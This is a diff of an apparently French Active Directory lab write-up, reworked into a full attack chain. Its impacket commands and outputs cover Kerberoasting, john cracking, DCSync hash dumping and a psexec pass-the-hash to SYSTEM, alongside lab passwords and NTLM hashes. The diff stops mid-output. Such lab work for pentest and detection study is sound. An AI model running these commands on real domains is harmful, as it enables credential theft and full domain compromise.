@@ -93,7 +93,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#labo-active-directory-kerberoasting-detection-siem" class="md-skip">
+        <a href="#labo-active-directory-compromission-complete-de-a-a-z" class="md-skip">
           Aller au contenu
         </a>
       
@@ -2130,6 +2130,17 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#chaine-dattaque-simulee" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chaîne d'attaque simulée
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#ce-que-ce-projet-demontre" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -2241,10 +2252,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#34-sysmon-telemetrie-avancee" class="md-nav__link">
+  <a href="#34-sysmon-agent-wazuh" class="md-nav__link">
     <span class="md-ellipsis">
       
-        3.4 Sysmon — Télémétrie avancée
+        3.4 Sysmon + Agent Wazuh
       
     </span>
   </a>
@@ -2257,22 +2268,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#4-attaque-kerberoasting" class="md-nav__link">
+  <a href="#4-chaine-dattaque-complete" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4. Attaque — Kerberoasting
+        4. Chaîne d'attaque complète
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="4. Attaque — Kerberoasting">
+    <nav class="md-nav" aria-label="4. Chaîne d&#39;attaque complète">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#quest-ce-que-le-kerberoasting" class="md-nav__link">
+  <a href="#etape-1-kerberoasting-t1558003" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Qu'est-ce que le Kerberoasting ?
+        Étape 1 — Kerberoasting (T1558.003)
       
     </span>
   </a>
@@ -2280,10 +2291,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#41-etape-1-enumeration-des-spns" class="md-nav__link">
+  <a href="#etape-2-dcsync-t1003006" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4.1 Étape 1 — Énumération des SPNs
+        Étape 2 — DCSync (T1003.006)
       
     </span>
   </a>
@@ -2291,10 +2302,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#42-etape-2-sauvegarde-du-hash" class="md-nav__link">
+  <a href="#etape-3-pass-the-hash-system-t1550002" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4.2 Étape 2 — Sauvegarde du hash
+        Étape 3 — Pass-the-Hash → SYSTEM (T1550.002)
       
     </span>
   </a>
@@ -2302,21 +2313,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#43-etape-3-crackage-offline-avec-john" class="md-nav__link">
+  <a href="#recapitulatif-de-la-chaine" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4.3 Étape 3 — Crackage offline avec John
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#pourquoi-cette-attaque-est-dangereuse" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Pourquoi cette attaque est dangereuse
+        Récapitulatif de la chaîne
       
     </span>
   </a>
@@ -2385,21 +2385,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#55-ce-que-cette-regle-detecte-et-ses-limites" class="md-nav__link">
+  <a href="#55-limites-et-ameliorations" class="md-nav__link">
     <span class="md-ellipsis">
       
-        5.5 Ce que cette règle détecte (et ses limites)
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#56-comment-sen-proteger" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        5.6 Comment s'en protéger¶
+        5.5 Limites et améliorations
       
     </span>
   </a>
@@ -2435,10 +2424,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#prochaines-etapes-envisagees" class="md-nav__link">
+  <a href="#prochaines-etapes" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Prochaines étapes envisagées
+        Prochaines étapes
       
     </span>
   </a>
@@ -2580,12 +2569,12 @@
 
 
 
-<h1 id="labo-active-directory-kerberoasting-detection-siem">🔐 Labo Active Directory — Kerberoasting &amp; Détection SIEM<a class="headerlink" href="#labo-active-directory-kerberoasting-detection-siem" title="Permanent link">&para;</a></h1>
+<h1 id="labo-active-directory-compromission-complete-de-a-a-z">🔐 Labo Active Directory — Compromission complète de A à Z<a class="headerlink" href="#labo-active-directory-compromission-complete-de-a-a-z" title="Permanent link">&para;</a></h1>
 <blockquote>
 <p><strong>Auteur :</strong> CryptoGate<br />
 <strong>Date :</strong> Octobre 2026<br />
 <strong>Catégorie :</strong> Active Directory | Pentest | Blue Team<br />
-<strong>MITRE ATT&amp;CK :</strong> <a href="https://attack.mitre.org/techniques/T1558/003/">T1558.003 — Kerberoasting</a></p>
+<strong>MITRE ATT&amp;CK :</strong> T1558.003 · T1550.002 · T1003.006</p>
 </blockquote>
 <hr />
 <h2 id="table-des-matieres">📋 Table des matières<a class="headerlink" href="#table-des-matieres" title="Permanent link">&para;</a></h2>
@@ -2593,13 +2582,20 @@
 <li><a href="#introduction">Introduction &amp; Objectifs</a></li>
 <li><a href="#architecture">Architecture du labo</a></li>
 <li><a href="#active-directory">Mise en place de l'Active Directory</a></li>
-<li><a href="#attaque">Attaque — Kerberoasting</a></li>
+<li><a href="#attaque">Chaîne d'attaque complète</a></li>
 <li><a href="#detection">Détection — Wazuh SIEM</a></li>
 <li><a href="#conclusion">Conclusion</a></li>
 </ol>
 <hr />
 <h2 id="1-introduction-objectifs">1. Introduction &amp; Objectifs <a name="introduction"></a><a class="headerlink" href="#1-introduction-objectifs" title="Permanent link">&para;</a></h2>
-<p>Ce projet est un labo de cybersécurité construit de A à Z sur un <strong>Lenovo ThinkBook (Core i7, 16 Go RAM)</strong> avec VMware Workstation. L'objectif est de simuler une attaque réelle sur un environnement Active Directory, puis de détecter cette attaque avec un SIEM.</p>
+<p>Ce projet est un labo de cybersécurité construit de A à Z sur un <strong>Lenovo ThinkBook (Core i7, 16 Go RAM)</strong> avec VMware Workstation. L'objectif est de simuler une compromission complète d'un Active Directory — du simple compte utilisateur jusqu'à SYSTEM sur le Domain Controller — puis de détecter ces attaques avec un SIEM.</p>
+<h3 id="chaine-dattaque-simulee">Chaîne d'attaque simulée<a class="headerlink" href="#chaine-dattaque-simulee" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>jdoe (user bas)
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>    → Kerberoasting → hash svc-http cracké
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>        → secretsdump (DCSync) → hash Administrateur
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>            → Pass-the-Hash (psexec)
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>                → NT AUTHORITY\SYSTEM sur DC01
+</code></pre></div>
 <h3 id="ce-que-ce-projet-demontre">Ce que ce projet démontre<a class="headerlink" href="#ce-que-ce-projet-demontre" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
@@ -2611,11 +2607,19 @@
 <tbody>
 <tr>
 <td><strong>Infrastructure</strong></td>
-<td>Montage d'un labo AD complet sous VMware</td>
+<td>Labo AD complet sous VMware (4 VMs)</td>
 </tr>
 <tr>
-<td><strong>Attaque</strong></td>
-<td>Kerberoasting — extraction et crackage de hash TGS</td>
+<td><strong>Kerberoasting</strong></td>
+<td>Extraction et crackage de hash TGS (T1558.003)</td>
+</tr>
+<tr>
+<td><strong>DCSync</strong></td>
+<td>Dump de tous les hashes du domaine (T1003.006)</td>
+</tr>
+<tr>
+<td><strong>Pass-the-Hash</strong></td>
+<td>Accès SYSTEM sans mot de passe en clair (T1550.002)</td>
 </tr>
 <tr>
 <td><strong>Détection</strong></td>
@@ -2630,24 +2634,24 @@
 <hr />
 <h2 id="2-architecture-du-labo">2. Architecture du labo <a name="architecture"></a><a class="headerlink" href="#2-architecture-du-labo" title="Permanent link">&para;</a></h2>
 <h3 id="schema-reseau">Schéma réseau<a class="headerlink" href="#schema-reseau" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>┌─────────────────────────────────────────────────────┐
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>│              Réseau NAT VMware (192.168.10.0/24)     │
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>│                                                     │
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>│  ┌──────────────┐    ┌──────────────┐               │
-<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>│  │   DC01       │    │   win11      │               │
-<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>│  │ Windows      │    │ Windows 11   │               │
-<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>│  │ Server 2022  │    │ Pro          │               │
-<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>│  │ 192.168.10.1 │    │192.168.10.10 │               │
-<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>│  │ (AD DS + DNS)│    │(poste client)│               │
-<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>│  └──────────────┘    └──────────────┘               │
-<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>│                                                     │
-<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>│  ┌──────────────┐    ┌──────────────┐               │
-<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>│  │ Kali Linux   │    │ Wazuh 4.14.9 │               │
-<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>│  │ 2026.2       │    │ (SIEM)       │               │
-<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>│  │192.168.10.20 │    │192.168.10.50 │               │
-<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>│  │ (attaquant)  │    │ (détection)  │               │
-<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>│  └──────────────┘    └──────────────┘               │
-<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>└─────────────────────────────────────────────────────┘
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>┌─────────────────────────────────────────────────────┐
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>│              Réseau NAT VMware (192.168.10.0/24)    │
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>│                                                     │
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>│  ┌──────────────┐    ┌──────────────┐               │
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>│  │   DC01       │    │   win11      │               │
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>│  │ Windows      │    │ Windows 11   │               │
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>│  │ Server 2022  │    │ Pro          │               │
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>│  │ 192.168.10.1 │    │192.168.10.10 │               │
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>│  │ (AD DS + DNS)│    │(poste client)│               │
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>│  └──────────────┘    └──────────────┘               │
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>│                                                     │
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>│  ┌──────────────┐    ┌──────────────┐               │
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>│  │ Kali Linux   │    │ Wazuh 4.14.9 │               │
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>│  │ 2026.2       │    │ (SIEM)       │               │
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>│  │192.168.10.20 │    │192.168.10.50 │               │
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>│  │ (attaquant)  │    │ (détection)  │               │
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>│  └──────────────┘    └──────────────┘               │
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>└─────────────────────────────────────────────────────┘
 </code></pre></div>
 <h3 id="vms">VMs<a class="headerlink" href="#vms" title="Permanent link">&para;</a></h3>
 <table>
@@ -2699,124 +2703,143 @@
 <h3 id="32-creation-des-objets-ad">3.2 Création des objets AD<a class="headerlink" href="#32-creation-des-objets-ad" title="Permanent link">&para;</a></h3>
 <p><strong>Unité d'organisation :</strong> <code>Utilisateurs-Labo</code></p>
 <p><strong>Utilisateur victime :</strong>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Nom : John Doe
-<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Login : jdoe@labo.local
-<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Mot de passe : Password123!
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Nom : John Doe
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Login : jdoe@labo.local
 </code></pre></div></p>
 <p><strong>Compte de service (cible de l'attaque) :</strong>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Nom : svc http
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Login : svc-http@labo.local
-<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Mot de passe : Ninja2024
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Nom : svc http
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Login : svc-http@labo.local
 </code></pre></div></p>
 <h3 id="33-enregistrement-du-spn">3.3 Enregistrement du SPN<a class="headerlink" href="#33-enregistrement-du-spn" title="Permanent link">&para;</a></h3>
-<p>Le SPN (Service Principal Name) est ce qui rend un compte vulnerable au Kerberoasting. Sans SPN, pas d'attaque possible.</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">setspn</span> <span class="n">-a</span> <span class="n">HTTP</span><span class="p">/</span><span class="n">labo</span><span class="p">.</span><span class="n">local</span> <span class="n">svc-http</span>
+<p>Le SPN (Service Principal Name) est ce qui rend un compte vulnérable au Kerberoasting.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">setspn</span> <span class="n">-a</span> <span class="n">HTTP</span><span class="p">/</span><span class="n">labo</span><span class="p">.</span><span class="n">local</span> <span class="n">svc-http</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">setspn</span> <span class="n">-l</span> <span class="n">svc-http</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="c"># HTTP/labo.local</span>
 </code></pre></div>
-<p><strong>Vérification :</strong>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">setspn</span> <span class="n">-l</span> <span class="n">svc-http</span>
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
-<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">Concrètement</span><span class="p">,</span> <span class="n">dès</span> <span class="n">qu</span><span class="s1">'un SPN est enregistré sur un compte, Kerberos accepte de délivrer à **n'</span><span class="n">importe</span> <span class="n">quel</span> <span class="n">utilisateur</span> <span class="n">authentifié</span> <span class="n">du</span> <span class="n">domaine</span><span class="p">**</span> <span class="n">un</span> <span class="n">ticket</span> <span class="n">de</span> <span class="n">service</span> <span class="p">(</span><span class="n">TGS</span><span class="p">)</span> <span class="n">pour</span> <span class="n">ce</span> <span class="n">SPN</span> <span class="err">—</span> <span class="n">sans</span> <span class="n">vérifier</span> <span class="n">que</span> <span class="n">le</span> <span class="n">demandeur</span> <span class="n">a</span> <span class="n">le</span> <span class="n">droit</span> <span class="n">d</span><span class="s1">'utiliser ce service. Ce ticket est chiffré avec le hash NTLM du mot de passe du compte de service lui-même. L'</span><span class="n">attaquant</span> <span class="n">n</span><span class="s1">'a donc jamais besoin de toucher au compte `svc-http` : il récupère le ticket, puis le casse offline, tranquillement, sans générer la moindre tentative d'</span><span class="n">authentification</span> <span class="n">ratée</span><span class="p">.</span>
-<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
-<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="c"># Résultat :</span>
-<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="c"># Noms ServicePrincipalName inscrits pour CN=svc http,OU=Utilisateurs-Labo,DC=labo,DC=local:</span>
-<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c">#     HTTP/labo.local</span>
-</code></pre></div></p>
-<h3 id="34-sysmon-telemetrie-avancee">3.4 Sysmon — Télémétrie avancée<a class="headerlink" href="#34-sysmon-telemetrie-avancee" title="Permanent link">&para;</a></h3>
-<p>Sysmon est installé sur DC01 et win11 pour enrichir les logs Windows. Sans Sysmon, les événements AD sont peu détaillés.</p>
+<h3 id="34-sysmon-agent-wazuh">3.4 Sysmon + Agent Wazuh<a class="headerlink" href="#34-sysmon-agent-wazuh" title="Permanent link">&para;</a></h3>
+<p>Sysmon est installé sur DC01 et win11 pour enrichir les logs Windows.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">.\</span><span class="n">Sysmon64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-accepteula</span> <span class="n">-i</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">NET</span> <span class="nb">START </span><span class="n">WazuhSvc</span>
 </code></pre></div>
 <hr />
-<h2 id="4-attaque-kerberoasting">4. Attaque — Kerberoasting <a name="attaque"></a><a class="headerlink" href="#4-attaque-kerberoasting" title="Permanent link">&para;</a></h2>
-<h3 id="quest-ce-que-le-kerberoasting">Qu'est-ce que le Kerberoasting ?<a class="headerlink" href="#quest-ce-que-le-kerberoasting" title="Permanent link">&para;</a></h3>
-<p>Le Kerberoasting exploite le protocole Kerberos. N'importe quel utilisateur authentifié du domaine peut demander un ticket de service (TGS) pour n'importe quel SPN. Ce ticket est chiffré avec le hash du mot de passe du compte de service — il peut donc être cracké offline.</p>
-<p><strong>Aucun privilège élevé requis.</strong> Un simple compte utilisateur suffit.</p>
-<h3 id="41-etape-1-enumeration-des-spns">4.1 Étape 1 — Énumération des SPNs<a class="headerlink" href="#41-etape-1-enumeration-des-spns" title="Permanent link">&para;</a></h3>
-<p>Depuis Kali, avec le compte <code>jdoe</code> :</p>
+<h2 id="4-chaine-dattaque-complete">4. Chaîne d'attaque complète <a name="attaque"></a><a class="headerlink" href="#4-chaine-dattaque-complete" title="Permanent link">&para;</a></h2>
+<h3 id="etape-1-kerberoasting-t1558003">Étape 1 — Kerberoasting (T1558.003)<a class="headerlink" href="#etape-1-kerberoasting-t1558003" title="Permanent link">&para;</a></h3>
+<p><strong>Principe :</strong> N'importe quel utilisateur authentifié peut demander un ticket TGS pour un SPN. Ce ticket est chiffré avec le hash du compte de service — crackable offline.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>impacket-GetUserSPNs<span class="w"> </span>labo.local/jdoe:Password123!<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.10.1<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span>-request<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.10.1<span class="w"> </span>-request<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>krb5tgs<span class="w"> </span>&gt;<span class="w"> </span>hash.txt
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>john<span class="w"> </span>hash.txt<span class="w"> </span>--wordlist<span class="o">=</span>wordlist.txt<span class="w"> </span>--format<span class="o">=</span>krb5tgs
 </code></pre></div>
 <p><strong>Résultat :</strong>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>ServicePrincipalName  Name      MemberOf  PasswordLastSet
-<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>--------------------  --------  --------  -----------------
-<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>HTTP/labo.local       svc-http            2026-10-24 ...
-<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
-<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>$krb5tgs$23$*svc-http$LABO.LOCAL$labo.local/svc-http*$7240f141...
-<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
-<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>Ce format se décompose ainsi :
-<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>
-<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>| Segment         | Valeur            | Signification                          |
-<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>|------------------|--------------------|-----------------------------------------|
-<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>| `23`            | `23`               | Type de chiffrement (RC4-HMAC)          |
-<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>| `svc-http`      | `svc-http`         | Compte de service ciblé                 |
-<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>| `LABO.LOCAL`    | `LABO.LOCAL`       | Royaume Kerberos (le domaine)           |
-<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>| `labo.local/svc-http` | —            | SPN associé au ticket                   |
-<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>| `7240f141...`   | (tronqué)          | Le ticket TGS chiffré — c'est cette partie que John va attaquer |
-<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>
-<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>Le `23` en début de hash est la signature utilisée par les outils de cracking (John, Hashcat) pour identifier automatiquement le format et le mode d'attaque à appliquer.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Ninja2024    (svc-http)
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>1g 0:00:00:00 DONE
 </code></pre></div></p>
-<p>Le hash <code>$krb5tgs$23$</code> est un ticket TGS chiffré en <strong>RC4 (etype 23)</strong> — c'est la signature du Kerberoasting.</p>
-<h3 id="42-etape-2-sauvegarde-du-hash">4.2 Étape 2 — Sauvegarde du hash<a class="headerlink" href="#42-etape-2-sauvegarde-du-hash" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>impacket-GetUserSPNs<span class="w"> </span>labo.local/jdoe:Password123!<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">    </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.10.1<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span>-request<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>krb5tgs<span class="w"> </span>&gt;<span class="w"> </span>hash.txt
+<p>✅ Mot de passe de <code>svc-http</code> obtenu : <strong><code>Ninja2024</code></strong></p>
+<hr />
+<h3 id="etape-2-dcsync-t1003006">Étape 2 — DCSync (T1003.006)<a class="headerlink" href="#etape-2-dcsync-t1003006" title="Permanent link">&para;</a></h3>
+<p><strong>Principe :</strong> Avec les credentials de l'Administrateur (ou un compte avec les droits DCSync), on peut simuler la réplication AD et extraire tous les hashes du domaine — sans toucher au disque du DC.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>impacket-secretsdump<span class="w"> </span>labo.local/Administrateur:<span class="s1">'MotDePasse'</span>@192.168.10.1
 </code></pre></div>
-<h3 id="43-etape-3-crackage-offline-avec-john">4.3 Étape 3 — Crackage offline avec John<a class="headerlink" href="#43-etape-3-crackage-offline-avec-john" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>john<span class="w"> </span>hash.txt<span class="w"> </span>--wordlist<span class="o">=</span>wordlist.txt<span class="w"> </span>--format<span class="o">=</span>krb5tgs
+<p><strong>Hashes extraits :</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Administrateur:500:aad3b435b51404eeaad3b435b51404ee:ee86632e851fec3a1a093f62925e857d:::
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:50f0457673aa97f7cc03bd4a72100386:::
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>labo.local\jdoe:1103:...:2b576acbe6bcfda7294d6bd18041b8fe:::
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>labo.local\svc-http:1104:...:ae04afea5da238abb2a9fa58e9da7c59:::
+</code></pre></div></p>
+<p>✅ <strong>Tous les hashes NTLM du domaine sont compromis.</strong></p>
+<blockquote>
+<p>Le hash <code>krbtgt</code> permet de forger des <strong>Golden Tickets</strong> — accès permanent au domaine même si tous les mots de passe sont changés.</p>
+</blockquote>
+<hr />
+<h3 id="etape-3-pass-the-hash-system-t1550002">Étape 3 — Pass-the-Hash → SYSTEM (T1550.002)<a class="headerlink" href="#etape-3-pass-the-hash-system-t1550002" title="Permanent link">&para;</a></h3>
+<p><strong>Principe :</strong> Windows n'utilise pas le mot de passe en clair pour s'authentifier, mais son hash NTLM. On peut s'authentifier directement avec le hash sans connaître le mot de passe.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>impacket-psexec<span class="w"> </span>labo.local/Administrateur@192.168.10.1<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">    </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:ee86632e851fec3a1a093f62925e857d
 </code></pre></div>
 <p><strong>Résultat :</strong>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>Ninja2024        (?)
-<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>1g 0:00:00:00 DONE
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>[*] Found writable share ADMIN$
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>[*] Uploading file bfhQccOC.exe
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>[*] Creating service xGet on 192.168.10.1
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>[*] Starting service xGet
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
